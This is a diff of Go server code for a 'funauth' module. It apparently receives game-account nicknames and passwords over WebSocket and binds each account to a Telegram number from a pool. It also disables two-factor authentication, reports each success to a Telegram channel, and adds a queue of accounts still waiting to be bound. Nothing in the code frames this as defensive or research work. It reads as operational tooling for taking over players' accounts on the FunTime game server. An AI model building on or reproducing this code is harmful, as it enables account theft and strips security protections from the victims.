@@ -9,6 +9,7 @@ import (
 	"io/fs"
 	"log"
 	"net/http"
+	"sort"
 	"strings"
 	"sync"
 	"time"
@@ -22,6 +23,10 @@ var (
 	// nick → last bind outcome: "pending" | "ok" | "no_accounts" | "fail"
 	funauthNickState   = make(map[string]string)
 	funauthNickStateMu sync.Mutex
+
+	// FunTime на входе просит /vk|/tg — даже если nicks.json уже полный.
+	funauthNeedBind   = make(map[string]funauthNeedBindRow)
+	funauthNeedBindMu sync.Mutex
 )
 
 func initFunauth() {
@@ -144,6 +149,7 @@ func funauthAPI(w http.ResponseWriter, r *http.Request) {
 			"rosterTotal":   rosterTotal,
 			"rosterBound":   rosterBound,
 			"rosterPending": rosterPending,
+			"needsBind":     funauthListNeedBind(),
 		})
 		return
 
@@ -357,16 +363,70 @@ func funauthNickKey(nick string) string {
 	return strings.ToLower(strings.TrimSpace(nick))
 }
 
-// Разрешить bind, если ник ещё не в nicks.json и не game-verified.
+type funauthNeedBindRow struct {
+	Nick    string `json:"nick"`
+	Anarchy int    `json:"anarchy,omitempty"`
+	At      string `json:"at"`
+}
+
+func funauthMarkNeedBind(nick string, anarchy int) {
+	key := funauthNickKey(nick)
+	if key == "" {
+		return
+	}
+	funauthNeedBindMu.Lock()
+	funauthNeedBind[key] = funauthNeedBindRow{
+		Nick:    strings.TrimSpace(nick),
+		Anarchy: anarchy,
+		At:      time.Now().UTC().Format(time.RFC3339),
+	}
+	funauthNeedBindMu.Unlock()
+}
+
+func funauthClearNeedBind(nick string) {
+	key := funauthNickKey(nick)
+	if key == "" {
+		return
+	}
+	funauthNeedBindMu.Lock()
+	delete(funauthNeedBind, key)
+	funauthNeedBindMu.Unlock()
+}
+
+func funauthListNeedBind() []funauthNeedBindRow {
+	funauthNeedBindMu.Lock()
+	defer funauthNeedBindMu.Unlock()
+	out := make([]funauthNeedBindRow, 0, len(funauthNeedBind))
+	for _, row := range funauthNeedBind {
+		out = append(out, row)
+	}
+	sort.Slice(out, func(i, j int) bool {
+		if out[i].Anarchy != out[j].Anarchy {
+			return out[i].Anarchy < out[j].Anarchy
+		}
+		return strings.ToLower(out[i].Nick) < strings.ToLower(out[j].Nick)
+	})
+	return out
+}
+
+// Разрешить bind. Запись в nicks.json не стопает: FunTime снова просит /tg — полный /bind + /2fa.
 func funauthMayStartBind(nick string) (ok bool, reason string) {
 	initFunauth()
 	key := funauthNickKey(nick)
-	if funauthPoolInst != nil && funauthPoolInst.nickBound(nick) {
-		return false, "already_bound"
+	idle := funauthBinderInst != nil && funauthBinderInst.queueLen() == 0
+	funauthNickStateMu.Lock()
+	defer funauthNickStateMu.Unlock()
+	st, _ := funauthNickState[key]
+	if st == "pending" && !idle {
+		return false, "already_pending"
 	}
-	if funauthPoolInst != nil && funauthPoolInst.nickVerified(nick) {
-		return false, "already_verified"
-	}
+	funauthNickState[key] = "pending"
+	return true, ""
+}
+
+func funauthMayStartTwoFA(nick string) (ok bool, reason string) {
+	initFunauth()
+	key := funauthNickKey(nick)
 	idle := funauthBinderInst != nil && funauthBinderInst.queueLen() == 0
 	funauthNickStateMu.Lock()
 	defer funauthNickStateMu.Unlock()
@@ -394,16 +454,9 @@ func handleFunauthBindWS(nick, password string, anarchy int) {
 		log.Printf("[funauth] skip empty nick/password")
 		return
 	}
+	funauthMarkNeedBind(nick, anarchy)
 	if ok, why := funauthMayStartBind(nick); !ok {
 		log.Printf("[funauth] skip %s (%s)", nick, why)
-		if why == "already_bound" {
-			broadcastFunauthResult(map[string]interface{}{
-				"action": "funauth_result",
-				"ok":     true,
-				"nick":   nick,
-				"note":   "already_bound",
-			})
-		}
 		return
 	}
 
@@ -462,6 +515,7 @@ func handleFunauthBindWS(nick, password string, anarchy int) {
 
 		if result.OK {
 			funauthSetNickState(nick, "ok")
+			funauthClearNeedBind(nick)
 			log.Printf("[funauth] ok %s via %s", nick, result.TgPhone)
 			enqueueTelegramMessage(
 				fmt.Sprintf("✅ FunAuth: `%s` привязан (tg %s), 2FA выкл", nick, result.TgPhone),
@@ -494,6 +548,7 @@ func handleFunauthVerifiedWS(nick string, anarchy int) {
 		log.Printf("[funauth] verified skip empty nick")
 		return
 	}
+	funauthClearNeedBind(nick)
 	if funauthPoolInst == nil {
 		return
 	}
@@ -518,7 +573,7 @@ func handleFunauthTwoFAWS(nick string, anarchy int) {
 		log.Printf("[funauth] 2fa skip empty nick")
 		return
 	}
-	if ok, why := funauthMayStartBind(nick); !ok {
+	if ok, why := funauthMayStartTwoFA(nick); !ok {
 		log.Printf("[funauth] 2fa skip %s (%s)", nick, why)
 		return
 	}
@@ -559,6 +614,7 @@ func handleFunauthTwoFAWS(nick string, anarchy int) {
 
 		if result.OK {
 			funauthSetNickState(nick, "ok")
+			funauthClearNeedBind(nick)
 			log.Printf("[funauth] 2fa ok %s via %s", nick, result.TgPhone)
 			enqueueTelegramMessage(
 				fmt.Sprintf("✅ FunAuth 2FA: `%s` выкл (tg %s)", nick, result.TgPhone),
